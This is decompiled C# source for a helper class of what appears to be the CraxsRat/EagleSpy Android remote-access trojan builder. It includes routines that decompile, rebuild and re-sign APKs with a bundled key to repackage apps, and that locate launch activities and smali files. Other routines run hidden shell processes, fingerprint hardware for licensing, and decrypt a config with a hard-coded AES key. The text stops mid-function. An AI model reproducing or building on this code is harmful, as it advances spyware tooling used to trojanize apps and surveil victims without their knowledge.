using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Drawing.Imaging;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Management;
using System.Net;
using System.Net.NetworkInformation;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Web;
using System.Windows.Forms;
using System.Xml;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using Newtonsoft.Json.Linq;

// Token: 0x02000046 RID: 70
[StandardModule]
internal sealed class Codes
{
	// Token: 0x06000301 RID: 769 RVA: 0x0004E278 File Offset: 0x0004C478
	public static bool IsValidPackageName(string packageName)
	{
		bool result;
		if (string.IsNullOrWhiteSpace(packageName))
		{
			result = false;
		}
		else if (!char.IsLetter(packageName[0]))
		{
			result = false;
		}
		else
		{
			Regex regex = new Regex("^[a-zA-Z0-9.]+$");
			result = (regex.IsMatch(packageName) && packageName.Contains(".") && !packageName.StartsWith(".") && !packageName.EndsWith("."));
		}
		return result;
	}

	// Token: 0x06000302 RID: 770 RVA: 0x0004E2FC File Offset: 0x0004C4FC
	public static bool CheckPort(int Port)
	{
		IPGlobalProperties ipglobalProperties = IPGlobalProperties.GetIPGlobalProperties();
		IPEndPoint[] activeTcpListeners = ipglobalProperties.GetActiveTcpListeners();
		foreach (IPEndPoint ipendPoint in activeTcpListeners)
		{
			if (ipendPoint.Port == Port)
			{
				return false;
			}
		}
		return true;
	}

	// Token: 0x06000303 RID: 771 RVA: 0x0004E348 File Offset: 0x0004C548
	public static string ServerMessage(string url, bool ispost = false, string postParams = "")
	{
		try
		{
			WebRequest webRequest = WebRequest.Create(url);
			webRequest.Method = "GET";
			if (ispost)
			{
				webRequest.Method = "POST";
				byte[] bytes = System.Text.Encoding.UTF8.GetBytes(postParams);
				webRequest.ContentType = "application/x-www-form-urlencoded";
				webRequest.ContentLength = (long)bytes.Length;
				using (Stream requestStream = webRequest.GetRequestStream())
				{
					requestStream.Write(bytes, 0, bytes.Length);
				}
			}
			WebResponse response = webRequest.GetResponse();
			using (Stream responseStream = response.GetResponseStream())
			{
				using (StreamReader streamReader = new StreamReader(responseStream))
				{
					return streamReader.ReadToEnd();
				}
			}
		}
		catch (Exception)
		{
		}
		return "Error";
	}

	// Token: 0x06000304 RID: 772 RVA: 0x0004E430 File Offset: 0x0004C630
	public static string ReadConfig(string childName)
	{
		try
		{
			string baseDirectory = AppDomain.CurrentDomain.BaseDirectory;
			string text = File.ReadAllText(baseDirectory + "\\Config.json");
			JObject jobject = JObject.Parse(Codes.AES_Decrypt(text, "q}%h%anHhw;sW.u*$eX{W]EYCHo9m8PxK;"));
			JToken jtoken = jobject["Cloud"];
			JToken jtoken2 = jtoken[childName];
			return jtoken2.ToString();
		}
		catch (Exception)
		{
		}
		return "null";
	}

	// Token: 0x06000305 RID: 773 RVA: 0x0004E4A8 File Offset: 0x0004C6A8
	public static int nearstmulti(int v, int n)
	{
		return checked((int)Math.Round(unchecked(Math.Round((double)v / (double)n) * (double)n)));
	}

	// Token: 0x06000306 RID: 774 RVA: 0x0004E4CC File Offset: 0x0004C6CC
	public static Bitmap ReadBitmapFromFile(string s_Path)
	{
		Bitmap result;
		try
		{
			using (FileStream fileStream = new FileStream(s_Path, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
			{
				using (Bitmap bitmap = new Bitmap(fileStream))
				{
					result = new Bitmap(bitmap);
				}
			}
		}
		catch (Exception)
		{
			result = new Bitmap(4, 4);
		}
		return result;
	}

	// Token: 0x06000307 RID: 775 RVA: 0x0004E544 File Offset: 0x0004C744
	public static string GetDriv()
	{
		string result;
		try
		{
			string[] separator = new string[]
			{
				"\\"
			};
			string[] array = Application.StartupPath.Split(separator, StringSplitOptions.RemoveEmptyEntries);
			result = array[0].ToString() + "\\";
		}
		catch (Exception)
		{
			result = "C:\\";
		}
		return result;
	}

	// Token: 0x06000308 RID: 776 RVA: 0x0004E5A0 File Offset: 0x0004C7A0
	public static string hashmd5(string file_name)
	{
		byte[] array;
		using (MD5 md = MD5.Create())
		{
			using (FileStream fileStream = File.OpenRead(file_name))
			{
				fileStream.Position = 0L;
				array = md.ComputeHash(fileStream);
			}
		}
		object objectValue = RuntimeHelpers.GetObjectValue(Codes.ComputeHash(array));
		return Conversions.ToString(objectValue);
	}

	// Token: 0x06000309 RID: 777 RVA: 0x0004E61C File Offset: 0x0004C81C
	public static string FindActivityInSmali(string TheApkPath, string activityName, string smaliFolderPath)
	{
		string text = activityName.Replace('.', '/');
		string text2 = string.Concat(new string[]
		{
			TheApkPath,
			"/",
			smaliFolderPath,
			"/",
			text,
			".smali"
		});
		string result;
		if (File.Exists(text2))
		{
			result = text2;
		}
		else
		{
			result = "pass";
		}
		return result;
	}

	// Token: 0x0600030A RID: 778 RVA: 0x0004E678 File Offset: 0x0004C878
	public static bool FileInUse(string sFile)
	{
		bool result = false;
		if (File.Exists(sFile))
		{
			try
			{
				using (new FileStream(sFile, FileMode.Open, FileAccess.ReadWrite, FileShare.None))
				{
				}
			}
			catch (Exception)
			{
				result = true;
			}
		}
		return result;
	}

	// Token: 0x0600030B RID: 779 RVA: 0x0004E6CC File Offset: 0x0004C8CC
	public static List<string> GetActivityNames(string manifestPath, bool OnlyMain)
	{
		List<string> list = new List<string>();
		XmlDocument xmlDocument = new XmlDocument();
		xmlDocument.Load(manifestPath);
		XmlNamespaceManager xmlNamespaceManager = new XmlNamespaceManager(xmlDocument.NameTable);
		xmlNamespaceManager.AddNamespace("android", "http://schemas.android.com/apk/res/android");
		XmlNodeList xmlNodeList = xmlDocument.SelectNodes("//manifest/application/activity[intent-filter/action/@android:name='android.intent.action.MAIN']/@android:name", xmlNamespaceManager);
		foreach (object obj in xmlNodeList)
		{
			XmlNode xmlNode = (XmlNode)obj;
			Console.WriteLine(xmlNode.Value);
			list.Add(xmlNode.Value);
		}
		if (OnlyMain)
		{
			if (list.Count > 0)
			{
				return list;
			}
			Interaction.MsgBox("Detecting Main Activities Failed , Searching for other Activitys...", MsgBoxStyle.OkOnly, null);
		}
		XmlNodeList xmlNodeList2 = xmlDocument.SelectNodes("//manifest/application/activity/@android:name", xmlNamespaceManager);
		foreach (object obj2 in xmlNodeList2)
		{
			XmlNode xmlNode2 = (XmlNode)obj2;
			list.Add(xmlNode2.Value);
		}
		List<string> result;
		if (list.Count > 0)
		{
			result = list;
		}
		else
		{
			Interaction.MsgBox("Failed to find Activities...", MsgBoxStyle.OkOnly, null);
			result = null;
		}
		return result;
	}

	// Token: 0x0600030C RID: 780 RVA: 0x0004E820 File Offset: 0x0004CA20
	public static object ComputeHash(byte[] array)
	{
		string text = "";
		checked
		{
			int num = array.Length - 1;
			for (int i = 0; i <= num; i++)
			{
				text += array[i].ToString("X2");
			}
			return text.ToLower();
		}
	}

	// Token: 0x0600030D RID: 781
	[DllImport("user32.dll")]
	public static extern int SendMessage(IntPtr hWnd, int Msg, int wParam, int lParam);

	// Token: 0x0600030E RID: 782
	[DllImport("user32.dll")]
	public static extern bool ReleaseCapture();

	// Token: 0x0600030F RID: 783 RVA: 0x0004E86C File Offset: 0x0004CA6C
	public static Image Base64ToImage(string base64string)
	{
		string s = base64string.Replace(" ", "+");
		byte[] buffer = Convert.FromBase64String(s);
		MemoryStream memoryStream = new MemoryStream(buffer);
		Image result = Image.FromStream(memoryStream);
		memoryStream.Dispose();
		return result;
	}

	// Token: 0x06000310 RID: 784 RVA: 0x0004E8AC File Offset: 0x0004CAAC
	public static string ProcessJson(string chromeJson)
	{
		return chromeJson.Replace("}", "").Replace("]", "").Replace("[", "").Replace("\"", " ").Replace("{", "\r\n").Replace(",", "\r\n");
	}

	// Token: 0x06000311 RID: 785 RVA: 0x0004E918 File Offset: 0x0004CB18
	public static object inializeReg()
	{
		RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, RegistryView.Registry64);
		string text = "Software\\\\DataConfigrations";
		RegistryKey registryKey2 = registryKey.OpenSubKey(text, true);
		try
		{
			if (registryKey2 == null)
			{
				registryKey2 = registryKey.CreateSubKey(text);
			}
			return true;
		}
		catch (Exception)
		{
		}
		return false;
	}

	// Token: 0x06000312 RID: 786 RVA: 0x0004E97C File Offset: 0x0004CB7C
	public static void GetKeyFromReg(string key)
	{
		RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, RegistryView.Registry64);
		string name = "Software\\\\DataConfigrations";
		RegistryKey registryKey2 = registryKey.OpenSubKey(name, true);
		registryKey2.SetValue("PASSKEY", key);
		registryKey2.Close();
	}

	// Token: 0x06000313 RID: 787 RVA: 0x0004E9BC File Offset: 0x0004CBBC
	public static string getuserkey()
	{
		try
		{
			RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, RegistryView.Registry64);
			string name = "Software\\\\DataConfigrations";
			using (RegistryKey registryKey2 = registryKey.OpenSubKey(name, true))
			{
				object objectValue = RuntimeHelpers.GetObjectValue(registryKey2.GetValue("PASSKEY"));
				if (objectValue != null)
				{
					return registryKey2.GetValue("PASSKEY").ToString();
				}
			}
		}
		catch (Exception)
		{
		}
		return "";
	}

	// Token: 0x06000314 RID: 788 RVA: 0x0004EA4C File Offset: 0x0004CC4C
	public static Encoding Encoding()
	{
		return System.Text.Encoding.UTF8;
	}

	// Token: 0x06000315 RID: 789 RVA: 0x0004EA60 File Offset: 0x0004CC60
	public static Image ChangeImageOpacity(Bitmap originalImage)
	{
		float num = 50f;
		float gamma = 1f;
		float num2 = 0f;
		float[][] array = new float[5][];
		int num3 = 0;
		float[] array2 = new float[5];
		array2[0] = num;
		array[num3] = array2;
		int num4 = 1;
		float[] array3 = new float[5];
		array3[1] = num;
		array[num4] = array3;
		int num5 = 2;
		float[] array4 = new float[5];
		array4[2] = num;
		array[num5] = array4;
		int num6 = 3;
		float[] array5 = new float[5];
		array5[3] = 1f;
		array[num6] = array5;
		array[4] = new float[]
		{
			num2,
			num2,
			num2,
			0f,
			1f
		};
		float[][] newColorMatrix = array;
		Codes.imageAttributes.ClearColorMatrix();
		Codes.imageAttributes.SetColorMatrix(new ColorMatrix(newColorMatrix), ColorMatrixFlag.Default, ColorAdjustType.Bitmap);
		Codes.imageAttributes.SetGamma(gamma, ColorAdjustType.Bitmap);
		Graphics graphics = Graphics.FromImage(originalImage);
		graphics.DrawImage(originalImage, new Rectangle(0, 0, originalImage.Width, originalImage.Height), 0, 0, originalImage.Width, originalImage.Height, GraphicsUnit.Pixel, Codes.imageAttributes);
		return originalImage;
	}

	// Token: 0x06000316 RID: 790 RVA: 0x0004EB40 File Offset: 0x0004CD40
	public static string GenerateRandomFolderName(string nam)
	{
		Codes._Closure_0024__26_002D0 arg = null;
		Codes._Closure_0024__26_002D0 CS_0024_003C_003E8__locals0 = new Codes._Closure_0024__26_002D0(arg);
		string tempPath = Path.GetTempPath();
		string element = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
		int count = 10;
		CS_0024_003C_003E8__locals0._0024VB_0024Local_random = new Random();
		string path = "CraxsRat_" + nam + "_" + new string((from s in Enumerable.Repeat<string>(element, 10)
		select s[CS_0024_003C_003E8__locals0._0024VB_0024Local_random.Next(s.Length)]).ToArray<char>());
		string text = Path.Combine(tempPath, path);
		string driv = Codes.GetDriv();
		while (Directory.Exists(text))
		{
			path = string.Concat(new string[]
			{
				driv,
				"CraxsRat_",
				nam,
				"_",
				new string((from s in Enumerable.Repeat<string>(element, count)
				select s[CS_0024_003C_003E8__locals0._0024VB_0024Local_random.Next(s.Length)]).ToArray<char>())
			});
			text = Path.Combine(tempPath, path);
		}
		Directory.CreateDirectory(text);
		return text;
	}

	// Token: 0x06000317 RID: 791 RVA: 0x0004EC38 File Offset: 0x0004CE38
	public static void DirectoryDeleteLong(string directoryPath)
	{
		DirectoryInfo directoryInfo = new DirectoryInfo(Path.GetTempPath() + "\\TempEmptyDirectory-" + Guid.NewGuid().ToString());
		try
		{
			directoryInfo.Create();
			using (Process process = new Process())
			{
				process.StartInfo.FileName = "robocopy.exe";
				process.StartInfo.Arguments = string.Concat(new string[]
				{
					"\"",
					directoryInfo.FullName,
					"\" \"",
					directoryPath,
					"\" /mir /r:1 /w:1 /np /xj /sl"
				});
				process.StartInfo.UseShellExecute = false;
				process.StartInfo.CreateNoWindow = true;
				process.Start();
				process.WaitForExit();
			}
			directoryInfo.Delete();
			if (Directory.Exists(directoryPath))
			{
				DirectoryInfo directoryInfo2 = new DirectoryInfo(directoryPath);
				directoryInfo2.Attributes = FileAttributes.Normal;
				Directory.Delete(directoryPath);
			}
		}
		catch (IOException)
		{
		}
	}

	// Token: 0x06000318 RID: 792
	[DllImport("user32.dll")]
	public static extern uint SetWindowDisplayAffinity(IntPtr hWnd, uint dwAffinity);

	// Token: 0x06000319 RID: 793 RVA: 0x0004ED40 File Offset: 0x0004CF40
	public static string GetSpeed(string speed)
	{
		int num = checked((int)Math.Round((double)(Conversions.ToInteger(speed) * 3600) / 1000.0));
		return string.Format("{0} km/h", num);
	}

	// Token: 0x0600031A RID: 794 RVA: 0x0004ED80 File Offset: 0x0004CF80
	public static string Duration(int Time)
	{
		int num = Time % 60;
		checked
		{
			int num2 = (int)Math.Round((double)(Time - num) / 60.0 % 60.0);
			int num3 = (int)Math.Round((double)(Time - (num + num2 * 60)) / 3600.0 % 60.0);
			return string.Concat(new string[]
			{
				Strings.Format(num3, "00"),
				":",
				Strings.Format(num2, "00"),
				":",
				Strings.Format(num, "00").ToString()
			});
		}
	}

	// Token: 0x0600031B RID: 795 RVA: 0x0004EE30 File Offset: 0x0004D030
	public static string ToTime(long Value)
	{
		long num = Value / 3600L;
		checked
		{
			long num2 = (Value - num * 3600L) / 60L;
			long value = Value - (num * 3600L + num2 * 60L);
			return string.Concat(new string[]
			{
				Conversions.ToString(num),
				":",
				Conversions.ToString(num2),
				":",
				Conversions.ToString(value)
			});
		}
	}

	// Token: 0x0600031C RID: 796 RVA: 0x0004EEB8 File Offset: 0x0004D0B8
	public static byte[] CGzip(byte[] b)
	{
		byte[] result;
		try
		{
			using (MemoryStream memoryStream = new MemoryStream())
			{
				if (memoryStream.CanSeek)
				{
					memoryStream.Seek(0L, SeekOrigin.Begin);
				}
				using (GZipStream gzipStream = new GZipStream(memoryStream, CompressionMode.Compress, true))
				{
					gzipStream.Write(b, 0, b.Length);
				}
				result = memoryStream.ToArray();
			}
		}
		catch (Exception)
		{
			result = null;
		}
		return result;
	}

	// Token: 0x0600031D RID: 797 RVA: 0x0004EF4C File Offset: 0x0004D14C
	private static bool IsCompressedGZip(byte[] data)
	{
		return data.Length >= 2 && data[0] == 31 && data[1] == 139;
	}

	// Token: 0x0600031E RID: 798 RVA: 0x0004EF7C File Offset: 0x0004D17C
	public static byte[] DEgzip(ref byte[] b)
	{
		try
		{
			if (Codes.IsCompressedGZip(b))
			{
				using (MemoryStream memoryStream = new MemoryStream())
				{
					using (MemoryStream memoryStream2 = new MemoryStream(b))
					{
						if (memoryStream2.CanSeek)
						{
							memoryStream2.Seek(0L, SeekOrigin.Begin);
						}
						using (GZipStream gzipStream = new GZipStream(memoryStream2, CompressionMode.Decompress))
						{
							Codes.CopyStreamToStream(gzipStream, memoryStream);
						}
						return memoryStream.ToArray();
					}
				}
			}
			return null;
		}
		catch (Exception)
		{
		}
		return null;
	}

	// Token: 0x0600031F RID: 799 RVA: 0x0004F038 File Offset: 0x0004D238
	public static void CopyStreamToStream(Stream input, Stream output)
	{
		try
		{
			byte[] array = new byte[16384];
			int num;
			do
			{
				num = input.Read(array, 0, array.Length);
				output.Write(array, 0, num);
			}
			while (num != 0);
		}
		catch (Exception)
		{
		}
	}

	// Token: 0x06000320 RID: 800 RVA: 0x0004F080 File Offset: 0x0004D280
	private static T InlineAssignHelper<T>(ref T target, T value)
	{
		target = value;
		return value;
	}

	// Token: 0x06000321 RID: 801 RVA: 0x0004F098 File Offset: 0x0004D298
	public static object BSEN(string Str)
	{
		byte[] bytes = System.Text.Encoding.UTF8.GetBytes(Str);
		return Convert.ToBase64String(bytes);
	}

	// Token: 0x06000322 RID: 802 RVA: 0x0004F0BC File Offset: 0x0004D2BC
	public static Image BlankImage()
	{
		Image result;
		try
		{
			Bitmap bitmap = new Bitmap(1, 1);
			bitmap.SetPixel(0, 0, Color.Transparent);
			result = bitmap;
		}
		catch (Exception)
		{
			result = null;
		}
		return result;
	}

	// Token: 0x06000323 RID: 803 RVA: 0x0004F0FC File Offset: 0x0004D2FC
	public static string Translate(string inputtext, string fromlangid, string tolangid)
	{
		try
		{
			inputtext = HttpUtility.HtmlAttributeEncode(inputtext.Replace("\r\n", "[]"));
			string json = new WebClient
			{
				Encoding = System.Text.Encoding.UTF8
			}.DownloadString(string.Concat(new string[]
			{
				"https://translate.googleapis.com/translate_a/single?client=gtx&sl=auto&tl=",
				tolangid,
				"&hl=",
				fromlangid,
				"&dt=t&dt=bd&dj=1&source=icon&q=",
				inputtext
			}));
			JObject jobject = JObject.Parse(json);
			string text = jobject.SelectToken("sentences[0]").SelectToken("trans").ToString();
			return text.Replace("[]", "\r\n");
		}
		catch (Exception)
		{
		}
		return inputtext.Replace("[]", "\r\n");
	}

	// Token: 0x06000324 RID: 804 RVA: 0x0004F1C4 File Offset: 0x0004D3C4
	public static bool MyMsgBox(string title, string msg, bool useno, Bitmap ico)
	{
		try
		{
			string text = msg;
			string language = RegistryHandler.Get_Language();
			if (Operators.CompareString(language, "CN", false) != 0)
			{
				if (Operators.CompareString(language, "AR", false) == 0)
				{
					text = Codes.Translate(text, "en", "ar");
				}
			}
			else
			{
				text = Codes.Translate(text, "en", "zh");
			}
			EagleSpyMsgbox eagleSpyMsgbox = new EagleSpyMsgbox(title.Replace("  ", "\r\n"), text, useno, ico);
			if (eagleSpyMsgbox.ShowDialog() == DialogResult.Yes)
			{
				return true;
			}
		}
		catch (Exception)
		{
		}
		return false;
	}

	// Token: 0x06000325 RID: 805 RVA: 0x0004F264 File Offset: 0x0004D464
	public static string CheckForUpdates()
	{
		try
		{
			return Codes.ServerMessage(Codes.ReadConfig("CHECK_UPDATE"), true, string.Concat(new string[]
			{
				"api=S0tMeD0WoUQyO8wuButveJYoBlONhU5riAKBPn6R&email=",
				RegistryHandler.Get_EMAIL(),
				"&password=",
				Codes.getuserkey(),
				"&HWID=",
				(Codes.GetHWID() + RegistryHandler.Get_ID_ASSIST()).Trim()
			}));
		}
		catch (Exception)
		{
		}
		return "Error";
	}

	// Token: 0x06000326 RID: 806 RVA: 0x0004F2E8 File Offset: 0x0004D4E8
	public static string Excuteapkeditor_pro(string apkpath)
	{
		string text = reso.res_Path + "\\Lib\\ApkEditor.jar";
		if (!File.Exists(reso.res_Path + "\\"))
		{
			File.WriteAllBytes(text, Resources.APKEditor);
		}
		string str = string.Concat(new string[]
		{
			"java -jar \"",
			text,
			"\" p -i \"",
			apkpath,
			"\" && EXIT"
		});
		Process process = Process.Start(new ProcessStartInfo("cmd.exe", "/c " + str)
		{
			RedirectStandardOutput = true,
			UseShellExecute = false,
			CreateNoWindow = true,
			WindowStyle = ProcessWindowStyle.Hidden
		});
		string result = process.StandardOutput.ReadToEnd();
		process.WaitForExit();
		return result;
	}

	// Token: 0x06000327 RID: 807 RVA: 0x0004F3A8 File Offset: 0x0004D5A8
	public static string Excuteapkeditor(string apkpath)
	{
		string text = reso.res_Path + "\\Lib\\ApkEditor.jar";
		if (!File.Exists(text))
		{
			File.WriteAllBytes(text, Resources.APKEditor);
		}
		string str = string.Concat(new string[]
		{
			"java -jar \"",
			text,
			"\" info -i \"",
			apkpath,
			"\" && EXIT"
		});
		Process process = Process.Start(new ProcessStartInfo("cmd.exe", "/c " + str)
		{
			RedirectStandardOutput = true,
			UseShellExecute = false,
			CreateNoWindow = true,
			WindowStyle = ProcessWindowStyle.Hidden
		});
		string result = process.StandardOutput.ReadToEnd();
		process.WaitForExit();
		return result;
	}

	// Token: 0x06000328 RID: 808 RVA: 0x0004F45C File Offset: 0x0004D65C
	public static string ExecuteDecompile(string apkpath, string outdir)
	{
		string text = reso.res_Path + "\\Lib\\apktool.jar";
		if (!File.Exists(text))
		{
			File.WriteAllBytes(text, Resources.apktool);
		}
		string str = string.Concat(new string[]
		{
			"java -jar \"",
			text,
			"\" d -f \"",
			apkpath,
			"\" -o \"",
			outdir,
			"\" && EXIT"
		});
		Process process = Process.Start(new ProcessStartInfo("cmd.exe", "/c " + str)
		{
			RedirectStandardOutput = true,
			UseShellExecute = false,
			CreateNoWindow = true,
			WindowStyle = ProcessWindowStyle.Hidden
		});
		string result = process.StandardOutput.ReadToEnd();
		process.WaitForExit();
		return result;
	}

	// Token: 0x06000329 RID: 809 RVA: 0x0004F51C File Offset: 0x0004D71C
	public static string ExecuteSign(string apkpath, string outfilepath)
	{
		string text = reso.res_Path + "\\Lib\\apksigner.jar";
		string text2 = reso.res_Path + "\\Lib\\key.pk8";
		string text3 = reso.res_Path + "\\Lib\\certificate.pem";
		File.WriteAllBytes(text3, Resources.c);
		File.WriteAllBytes(text2, Resources.k);
		if (!File.Exists(text))
		{
			File.WriteAllBytes(text, Resources.apktool);
		}
		string str = string.Concat(new string[]
		{
			"java -jar \"",
			text,
			"\" sign --key \"",
			text2,
			"\" --cert \"",
			text3,
			"\" --v2-signing-enabled true --v3-signing-enabled true --out \"",
			outfilepath,
			"\" \"",
			apkpath,
			"\" && EXIT"
		});
		Process process = Process.Start(new ProcessStartInfo("cmd.exe", "/c " + str)
		{
			RedirectStandardOutput = true,
			UseShellExecute = false,
			CreateNoWindow = true,
			WindowStyle = ProcessWindowStyle.Hidden
		});
		string result = process.StandardOutput.ReadToEnd();
		process.WaitForExit();
		return result;
	}

	// Token: 0x0600032A RID: 810 RVA: 0x0004F634 File Offset: 0x0004D834
	public static string ExecuteCompile(string apkfolderpath, string outfilepath)
	{
		string text = reso.res_Path + "\\Lib\\apktool.jar";
		if (!File.Exists(text))
		{
			File.WriteAllBytes(text, Resources.apktool);
		}
		string str = string.Concat(new string[]
		{
			"java -jar \"",
			text,
			"\" b -f \"",
			apkfolderpath,
			"\" -o \"",
			outfilepath,
			"\" && EXIT"
		});
		Process process = Process.Start(new ProcessStartInfo("cmd.exe", "/c " + str)
		{
			RedirectStandardOutput = true,
			UseShellExecute = false,
			CreateNoWindow = true,
			WindowStyle = ProcessWindowStyle.Hidden
		});
		string result = process.StandardOutput.ReadToEnd();
		process.WaitForExit();
		return result;
	}

	// Token: 0x0600032B RID: 811 RVA: 0x0004F6F4 File Offset: 0x0004D8F4
	public static object RegexMatcher(string text, string match)
	{
		Regex regex = new Regex(text);
		Match match2 = regex.Match(match);
		return match2.ToString();
	}

	// Token: 0x0600032C RID: 812 RVA: 0x0004F718 File Offset: 0x0004D918
	public static string GetAndroidVersionName(string sdkNumber)
	{
		int num = 0;
		string result;
		if (int.TryParse(sdkNumber, out num))
		{
			string text;
			switch (num)
			{
			case 16:
				text = "Android 4.1 (Jelly Bean)";
				goto IL_F5;
			case 17:
				text = "Android 4.2 (Jelly Bean)";
				goto IL_F5;
			case 18:
				text = "Android 4.3 (Jelly Bean)";
				goto IL_F5;
			case 19:
				text = "Android 4.4 (KitKat)";
				goto IL_F5;
			case 21:
				text = "Android 5.0 (Lollipop)";
				goto IL_F5;
			case 22:
				text = "Android 5.1 (Lollipop)";
				goto IL_F5;
			case 23:
				text = "Android 6.0 (Marshmallow)";
				goto IL_F5;
			case 24:
				text = "Android 7.0 (Nougat)";
				goto IL_F5;
			case 25:
				text = "Android 7.1 (Nougat)";
				goto IL_F5;
			case 26:
				text = "Android 8.0 (Oreo)";
				goto IL_F5;
			case 27:
				text = "Android 8.1 (Oreo)";
				goto IL_F5;
			case 28:
				text = "Android 9 (Pie)";
				goto IL_F5;
			case 29:
				text = "Android 10";
				goto IL_F5;
			case 30:
				text = "Android 11";
				goto IL_F5;
			case 31:
				text = "Android 12";
				goto IL_F5;
			case 32:
				text = "Android 13";
				goto IL_F5;
			case 33:
				text = "Android 14";
				goto IL_F5;
			}
			text = "null";
			IL_F5:
			result = text;
		}
		else
		{
			result = "null";
		}
		return result;
	}

	// Token: 0x0600032D RID: 813 RVA: 0x0004F828 File Offset: 0x0004DA28
	public static string ProcessStartWithOutput(string FileName, string Arguments, int waitfor = 5000)
	{
		string text = string.Empty;
		try
		{
			using (Process process = new Process())
			{
				process.StartInfo.FileName = FileName;
				process.StartInfo.Arguments = Arguments;
				process.StartInfo.CreateNoWindow = true;
				process.StartInfo.RedirectStandardOutput = true;
				process.StartInfo.RedirectStandardError = true;
				process.StartInfo.UseShellExecute = false;
				process.Start();
				text = process.StandardOutput.ReadToEnd().Trim() + process.StandardError.ReadToEnd().Trim();
				if (waitfor == 0)
				{
					process.WaitForExit();
				}
				else
				{
					process.WaitForExit(waitfor);
				}
			}
		}
		catch (Exception ex)
		{
			Exception value = ex;
			Debug.WriteLine(value);
		}
		Debug.WriteLine(text);
		return text;
	}

	// Token: 0x0600032E RID: 814 RVA: 0x0004F914 File Offset: 0x0004DB14
	public static string RealPath(string path = "")
	{
		return Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location) + path;
	}

	// Token: 0x0600032F RID: 815 RVA: 0x0004F938 File Offset: 0x0004DB38
	public static string ExtractName(string apkpath)
	{
		string pattern = "AppName=\"([^\"]+)\"";
		Match match = Regex.Match(Codes.Excuteapkeditor(apkpath), pattern);
		string result;
		if (match.Success)
		{
			result = match.Groups[1].Value;
		}
		else
		{
			result = "";
		}
		return result;
	}

	// Token: 0x06000330 RID: 816 RVA: 0x0004F97C File Offset: 0x0004DB7C
	public static string ExtractPackage(string apkpath)
	{
		string pattern = "package=\"([^\"]+)\"";
		Match match = Regex.Match(Codes.Excuteapkeditor(apkpath), pattern);
		string result;
		if (match.Success)
		{
			result = match.Groups[1].Value;
		}
		else
		{
			result = "";
		}
		return result;
	}

	// Token: 0x06000331 RID: 817 RVA: 0x0004F9C0 File Offset: 0x0004DBC0
	public static string WhatNewupdate()
	{
		try
		{
			string text = Codes.ServerMessage(Codes.ReadConfig("WhatNew"), true, string.Concat(new string[]
			{
				"api=5XqtqjEv1eYwPeZAde1u9yWlu&email=",
				RegistryHandler.Get_EMAIL(),
				"&password=",
				Codes.getuserkey(),
				"&HWID=",
				(Codes.GetHWID() + RegistryHandler.Get_ID_ASSIST()).Trim()
			}));
			if (text.StartsWith("update"))
			{
				return text.Replace("[nl]", "\r\n");
			}
			return "ERROR";
		}
		catch (Exception)
		{
		}
		return "ERROR";
	}

	// Token: 0x06000332 RID: 818 RVA: 0x0004FA6C File Offset: 0x0004DC6C
	public static void File_zip_Decompress(string zipPath, string pathfolder)
	{
		if (!Directory.Exists(pathfolder))
		{
			Directory.CreateDirectory(pathfolder);
		}
		ZipFile.ExtractToDirectory(zipPath, pathfolder);
	}

	// Token: 0x06000333 RID: 819 RVA: 0x0004FA94 File Offset: 0x0004DC94
	public static Image ResizeImage(Image inputImage, Size size, bool preserveAspectRatio = false)
	{
		checked
		{
			Image result;
			if (inputImage.Width == size.Width && inputImage.Height == size.Height)
			{
				result = inputImage;
			}
			else
			{
				int width = size.Width;
				int height = size.Height;
				if (preserveAspectRatio)
				{
					int width2 = inputImage.Width;
					int height2 = inputImage.Height;
					float num = (float)Math.Min((double)size.Width / (double)width2, (double)size.Height / (double)height2);
					width = (int)Math.Round((double)(unchecked((float)width2 * num)));
					height = (int)Math.Round((double)(unchecked((float)height2 * num)));
				}
				Bitmap bitmap = new Bitmap(width, height);
				using (Graphics graphics = Graphics.FromImage(bitmap))
				{
					graphics.InterpolationMode = InterpolationMode.HighQualityBicubic;
					graphics.DrawImage(inputImage, 0, 0, width, height);
				}
				result = bitmap;
			}
			return result;
		}
	}

	// Token: 0x06000334 RID: 820 RVA: 0x0004FB80 File Offset: 0x0004DD80
	public static string GetHWID()
	{
		string result = null;
		try
		{
			StringBuilder stringBuilder = new StringBuilder();
			try
			{
				string str = Environment.GetFolderPath(Environment.SpecialFolder.System).Substring(0, 1);
				ManagementObject managementObject = new ManagementObject("win32_logicaldisk.deviceid=\"" + str + ":\"");
				managementObject.Get();
				stringBuilder.Append(managementObject["VolumeSerialNumber"].ToString());
			}
			catch (Exception)
			{
				stringBuilder.Append("VSVALID");
			}
			SelectQuery query = new SelectQuery("Win32_BaseBoard");
			ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher(query);
			try
			{
				foreach (ManagementBaseObject managementBaseObject in managementObjectSearcher.Get())
				{
					ManagementObject managementObject2 = (ManagementObject)managementBaseObject;
					stringBuilder.Append(managementObject2["SerialNumber"].ToString());
				}
			}
			catch (Exception)
			{
				stringBuilder.Append("SNVALID");
			}
			try
			{
				query = new SelectQuery("Win32_processor");
				managementObjectSearcher = new ManagementObjectSearcher(query);
				foreach (ManagementBaseObject managementBaseObject2 in managementObjectSearcher.Get())
				{
					ManagementObject managementObject3 = (ManagementObject)managementBaseObject2;
					stringBuilder.Append(managementObject3["processorId"].ToString());
				}
			}
			catch (Exception)
			{
				stringBuilder.Append("PIVALID");
			}
			result = stringBuilder.ToString().Trim().Replace("+", "_");
			return result;
		}
		catch (Exception)
		{
			Interaction.MsgBox("Error Generate ID", MsgBoxStyle.OkOnly, null);
			Environment.FailFast("Error Generate ID");
		}
		return result;
	}

	// Token: 0x06000335 RID: 821 RVA: 0x0004FDA4 File Offset: 0x0004DFA4
	public static object[] SplitByte(byte[] b, Array s)
	{
		object[] array = new object[2];
		MemoryStream memoryStream = new MemoryStream();
		long num = (long)s.GetValue(0);
		checked
		{
